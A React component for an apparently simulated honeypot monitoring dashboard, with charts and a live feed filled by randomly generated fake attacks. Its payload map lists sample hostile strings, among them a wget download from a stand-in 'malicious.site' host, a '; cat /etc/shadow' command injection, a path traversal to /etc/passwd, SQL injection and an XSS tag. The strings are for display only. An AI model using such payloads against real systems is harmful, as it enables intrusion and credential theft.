import React, { useState, useEffect } from 'react';
import { Shield, Activity, Globe, TrendingUp, AlertTriangle, MapPin, Clock, Terminal } from 'lucide-react';
import { LineChart, Line, BarChart, Bar, PieChart, Pie, Cell, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer } from 'recharts';

const HoneypotMonitor = () => {
  const [attacks, setAttacks] = useState([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [selectedPort, setSelectedPort] = useState('all');
  const [timeRange, setTimeRange] = useState('1h');
  const [stats, setStats] = useState({
    totalAttacks: 0,
    uniqueIPs: 0,
    topPort: 'N/A',
    topCountry: 'N/A'
  });

  // Simulated honeypot ports
  const honeypotPorts = [
    { port: 22, service: 'SSH', risk: 'high' },
    { port: 23, service: 'Telnet', risk: 'critical' },
    { port: 3389, service: 'RDP', risk: 'high' },
    { port: 445, service: 'SMB', risk: 'critical' },
    { port: 80, service: 'HTTP', risk: 'medium' },
    { port: 21, service: 'FTP', risk: 'high' },
    { port: 3306, service: 'MySQL', risk: 'high' },
    { port: 5432, service: 'PostgreSQL', risk: 'medium' }
  ];

  // Common attack patterns
  const attackPatterns = [
    'Brute Force Login',
    'SQL Injection Attempt',
    'Port Scanning',
    'Malware Download',
    'Credential Stuffing',
    'Directory Traversal',
    'Command Injection',
    'Buffer Overflow',
    'XSS Attempt',
    'DDoS Pattern'
  ];

  // Country codes for geographic distribution
  const countries = ['US', 'CN', 'RU', 'BR', 'IN', 'DE', 'FR', 'GB', 'KR', 'NL', 'VN', 'IR'];

  // Generate random IP
  const generateIP = () => {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
  };

  // Generate simulated attack
  const generateAttack = () => {
    const port = honeypotPorts[Math.floor(Math.random() * honeypotPorts.length)];
    const pattern = attackPatterns[Math.floor(Math.random() * attackPatterns.length)];
    const country = countries[Math.floor(Math.random() * countries.length)];
    
    return {
      id: Date.now() + Math.random(),
      timestamp: new Date(),
      ip: generateIP(),
      port: port.port,
      service: port.service,
      pattern: pattern,
      country: country,
      severity: port.risk,
      payload: generatePayload(pattern),
      blocked: true
    };
  };

  // Generate realistic attack payload
  const generatePayload = (pattern) => {
    const payloads = {
      'Brute Force Login': `admin:${Math.random().toString(36).substring(7)}`,
      'SQL Injection Attempt': "' OR '1'='1' --",
      'Port Scanning': 'SYN scan detected',
      'Malware Download': 'wget http://malicious.site/payload.sh',
      'Credential Stuffing': 'user@email.com:password123',
      'Directory Traversal': '../../../etc/passwd',
      'Command Injection': '; cat /etc/shadow',
      'Buffer Overflow': 'A'.repeat(256),
      'XSS Attempt': '<script>alert(1)</script>',
      'DDoS Pattern': 'Flood detected: 10000 req/sec'
    };
    return payloads[pattern] || 'Unknown payload';
  };

  // Start/Stop monitoring
  useEffect(() => {
    let interval;
    if (isMonitoring) {
      interval = setInterval(() => {
        const newAttack = generateAttack();
        setAttacks(prev => [newAttack, ...prev].slice(0, 100)); // Keep last 100 attacks
      }, Math.random() * 3000 + 1000); // Random interval between 1-4 seconds
    }
    return () => clearInterval(interval);
  }, [isMonitoring]);

  // Calculate statistics
  useEffect(() => {
    const uniqueIPs = new Set(attacks.map(a => a.ip)).size;
    const portCounts = attacks.reduce((acc, a) => {
      acc[a.port] = (acc[a.port] || 0) + 1;
      return acc;
    }, {});
    const topPort = Object.keys(portCounts).length > 0 
      ? Object.keys(portCounts).reduce((a, b) => portCounts[a] > portCounts[b] ? a : b)
      : 'N/A';

    const countryCounts = attacks.reduce((acc, a) => {
      acc[a.country] = (acc[a.country] || 0) + 1;
      return acc;
    }, {});
    const topCountry = Object.keys(countryCounts).length > 0
      ? Object.keys(countryCounts).reduce((a, b) => countryCounts[a] > countryCounts[b] ? a : b)
      : 'N/A';

    setStats({
      totalAttacks: attacks.length,
      uniqueIPs: uniqueIPs,
      topPort: topPort !== 'N/A' ? `${topPort} (${honeypotPorts.find(p => p.port === parseInt(topPort))?.service})` : 'N/A',
      topCountry: topCountry
    });
  }, [attacks]);

  // Get attack timeline data
  const getTimelineData = () => {
    const now = Date.now();
    const intervals = 12;
    const msPerInterval = 5 * 60 * 1000; // 5 minutes
    
    const data = [];
    for (let i = intervals - 1; i >= 0; i--) {
      const time = new Date(now - i * msPerInterval);
      const count = attacks.filter(a => {
        const attackTime = a.timestamp.getTime();
        return attackTime >= time.getTime() && attackTime < time.getTime() + msPerInterval;
      }).length;
      
      data.push({
        time: time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        attacks: count
      });
    }
    return data;
  };

  // Get port distribution data
  const getPortData = () => {
    const portCounts = attacks.reduce((acc, a) => {
      const key = `${a.port} (${a.service})`;
      acc[key] = (acc[key] || 0) + 1;
      return acc;
    }, {});

    return Object.entries(portCounts)
      .map(([name, value]) => ({ name, value }))
      .sort((a, b) => b.value - a.value)
      .slice(0, 6);
  };

  // Get attack pattern distribution
  const getPatternData = () => {
    const patternCounts = attacks.reduce((acc, a) => {
      acc[a.pattern] = (acc[a.pattern] || 0) + 1;
      return acc;
    }, {});

    return Object.entries(patternCounts)
      .map(([name, value]) => ({ name, value }))
      .sort((a, b) => b.value - a.value)
      .slice(0, 5);
  };

  // Get geographic distribution
  const getGeoData = () => {
    const countryCounts = attacks.reduce((acc, a) => {
      acc[a.country] = (acc[a.country] || 0) + 1;
      return acc;
    }, {});

    return Object.entries(countryCounts)
      .map(([name, value]) => ({ name, value }))
      .sort((a, b) => b.value - a.value);
  };

  const COLORS = ['#8b5cf6', '#ec4899', '#f59e0b', '#10b981', '#3b82f6', '#ef4444'];

  const filteredAttacks = selectedPort === 'all' 
    ? attacks 
    : attacks.filter(a => a.port === parseInt(selectedPort));

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-purple-950 to-slate-950 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="bg-white/10 backdrop-blur-md rounded-lg p-6 mb-6 border border-white/20">
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-3">
              <Shield className="w-10 h-10 text-purple-400" />
              <div>
                <h1 className="text-3xl font-bold text-white">Honeypot Attack Monitor</h1>
                <p className="text-purple-200">Real-time threat intelligence & visualization</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <button
                onClick={() => setIsMonitoring(!isMonitoring)}
                className={`px-6 py-3 rounded-lg font-medium transition-all ${
                  isMonitoring
                    ? 'bg-red-500 hover:bg-red-600 text-white'
                    : 'bg-green-500 hover:bg-green-600 text-white'
                }`}
              >
                {isMonitoring ? '⏸ Stop Monitoring' : '▶ Start Monitoring'}
              </button>
              <button
                onClick={() => setAttacks([])}
                className="px-6 py-3 bg-white/10 hover:bg-white/20 text-white rounded-lg font-medium transition-all"
              >
                Clear Data
              </button>
            </div>
          </div>
        </div>

        {/* Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
          <div className="bg-gradient-to-br from-purple-500/20 to-purple-600/20 backdrop-blur-md rounded-lg p-6 border border-purple-400/30">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-purple-200 text-sm">Total Attacks</p>
                <p className="text-3xl font-bold text-white mt-1">{stats.totalAttacks}</p>
              </div>
              <Activity className="w-12 h-12 text-purple-400 opacity-50" />
            </div>
          </div>

          <div className="bg-gradient-to-br from-blue-500/20 to-blue-600/20 backdrop-blur-md rounded-lg p-6 border border-blue-400/30">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-blue-200 text-sm">Unique IPs</p>
                <p className="text-3xl font-bold text-white mt-1">{stats.uniqueIPs}</p>
              </div>
              <Globe className="w-12 h-12 text-blue-400 opacity-50" />
            </div>
          </div>

          <div className="bg-gradient-to-br from-orange-500/20 to-orange-600/20 backdrop-blur-md rounded-lg p-6 border border-orange-400/30">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-orange-200 text-sm">Top Target</p>
                <p className="text-xl font-bold text-white mt-1">{stats.topPort}</p>
              </div>
              <TrendingUp className="w-12 h-12 text-orange-400 opacity-50" />
            </div>
          </div>

          <div className="bg-gradient-to-br from-red-500/20 to-red-600/20 backdrop-blur-md rounded-lg p-6 border border-red-400/30">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-red-200 text-sm">Top Source</p>
                <p className="text-3xl font-bold text-white mt-1">{stats.topCountry}</p>
              </div>
              <MapPin className="w-12 h-12 text-red-400 opacity-50" />
            </div>
          </div>
        </div>

        {/* Visualizations */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
          {/* Attack Timeline */}
          <div className="bg-white/10 backdrop-blur-md rounded-lg p-6 border border-white/20">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              <Clock className="w-5 h-5 text-purple-400" />
              Attack Timeline (Last Hour)
            </h2>
            <ResponsiveContainer width="100%" height={250}>
              <LineChart data={getTimelineData()}>
                <CartesianGrid strokeDasharray="3 3" stroke="#ffffff20" />
                <XAxis dataKey="time" stroke="#ffffff60" style={{ fontSize: '12px' }} />
                <YAxis stroke="#ffffff60" style={{ fontSize: '12px' }} />
                <Tooltip 
                  contentStyle={{ backgroundColor: '#1e1b4b', border: '1px solid #7c3aed' }}
                  labelStyle={{ color: '#fff' }}
                />
                <Line type="monotone" dataKey="attacks" stroke="#8b5cf6" strokeWidth={2} dot={{ fill: '#8b5cf6' }} />
              </LineChart>
            </ResponsiveContainer>
          </div>

          {/* Port Distribution */}
          <div className="bg-white/10 backdrop-blur-md rounded-lg p-6 border border-white/20">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              <TrendingUp className="w-5 h-5 text-purple-400" />
              Targeted Ports
            </h2>
            <ResponsiveContainer width="100%" height={250}>
              <BarChart data={getPortData()}>
                <CartesianGrid strokeDasharray="3 3" stroke="#ffffff20" />
                <XAxis dataKey="name" stroke="#ffffff60" style={{ fontSize: '11px' }} angle={-45} textAnchor="end" height={80} />
                <YAxis stroke="#ffffff60" style={{ fontSize: '12px' }} />
                <Tooltip 
                  contentStyle={{ backgroundColor: '#1e1b4b', border: '1px solid #7c3aed' }}
                  labelStyle={{ color: '#fff' }}
                />
                <Bar dataKey="value" fill="#8b5cf6" />
              </BarChart>
            </ResponsiveContainer>
          </div>

          {/* Attack Patterns */}
          <div className="bg-white/10 backdrop-blur-md rounded-lg p-6 border border-white/20">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              <AlertTriangle className="w-5 h-5 text-purple-400" />
              Attack Patterns
            </h2>
            <ResponsiveContainer width="100%" height={250}>
              <PieChart>
                <Pie
                  data={getPatternData()}
                  cx="50%"
                  cy="50%"
                  labelLine={false}
                  label={({ name, percent }) => `${name} (${(percent * 100).toFixed(0)}%)`}
                  outerRadius={80}
                  fill="#8884d8"
                  dataKey="value"
                >
                  {getPatternData().map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                  ))}
                </Pie>
                <Tooltip 
                  contentStyle={{ backgroundColor: '#1e1b4b', border: '1px solid #7c3aed' }}
                />
              </PieChart>
            </ResponsiveContainer>
          </div>

          {/* Geographic Distribution */}
          <div className="bg-white/10 backdrop-blur-md rounded-lg p-6 border border-white/20">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              <Globe className="w-5 h-5 text-purple-400" />
              Geographic Distribution
            </h2>
            <div className="space-y-2 max-h-[250px] overflow-y-auto">
              {getGeoData().map((country, index) => (
                <div key={country.name} className="flex items-center justify-between bg-white/5 rounded p-3">
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">{index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '📍'}</span>
                    <span className="text-white font-medium">{country.name}</span>
                  </div>
                  <div className="flex items-center gap-3">
                    <div className="w-32 bg-white/10 rounded-full h-2">
                      <div 
                        className="bg-purple-500 h-2 rounded-full"
                        style={{ width: `${(country.value / stats.totalAttacks) * 100}%` }}
                      />
                    </div>
                    <span className="text-purple-300 font-bold w-12 text-right">{country.value}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Live Attack Feed */}
        <div className="bg-white/10 backdrop-blur-md rounded-lg p-6 border border-white/20">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Terminal className="w-5 h-5 text-purple-400" />
              Live Attack Feed
            </h2>
            <select
              value={selectedPort}
              onChange={(e) => setSelectedPort(e.target.value)}
              className="bg-white/10 border border-white/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:ring-2 focus:ring-purple-400"
            >
              <option value="all">All Ports</option>
              {honeypotPorts.map(p => (
                <option key={p.port} value={p.port}>{p.port} - {p.service}</option>
              ))}
            </select>
          </div>

          <div className="space-y-2 max-h-96 overflow-y-auto">
            {filteredAttacks.length === 0 ? (
              <div className="text-center py-12 text-white/60">
                <Activity className="w-16 h-16 mx-auto mb-4 opacity-30" />
                <p>No attacks detected yet. Start monitoring to see live data.</p>
              </div>
            ) : (
              filteredAttacks.map(attack => (
                <div 
                  key={attack.id}
                  className={`p-4 rounded-lg border transition-all ${
                    attack.severity === 'critical' 
                      ? 'bg-red-500/10 border-red-400/30'
                      : attack.severity === 'high'
                      ? 'bg-orange-500/10 border-orange-400/30'
                      : 'bg-yellow-500/10 border-yellow-400/30'
                  }`}
                >
                  <div className="flex items-start justify-between flex-wrap gap-2">
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 mb-2">
                        <span className={`px-2 py-1 rounded text-xs font-bold ${
                          attack.severity === 'critical' ? 'bg-red-500 text-white' :
                          attack.severity === 'high' ? 'bg-orange-500 text-white' :
                          'bg-yellow-500 text-black'
                        }`}>
                          {attack.severity.toUpperCase()}
                        </span>
                        <span className="text-white font-mono text-sm">{attack.ip}</span>
                        <span className="text-white/60">→</span>
                        <span className="text-purple-300 font-medium">Port {attack.port} ({attack.service})</span>
                      </div>
                      <p className="text-white/80 text-sm mb-1">
                        <strong>Pattern:</strong> {attack.pattern}
                      </p>
                      <p className="text-white/60 text-xs font-mono break-all">
                        Payload: {attack.payload}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-white/60 text-xs">{attack.country}</p>
                      <p className="text-white/40 text-xs">{attack.timestamp.toLocaleTimeString()}</p>
                      {attack.blocked && (
                        <span className="inline-block mt-1 px-2 py-0.5 bg-green-500/20 text-green-300 text-xs rounded">
                          BLOCKED
                        </span>
                      )}
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default HoneypotMonitor;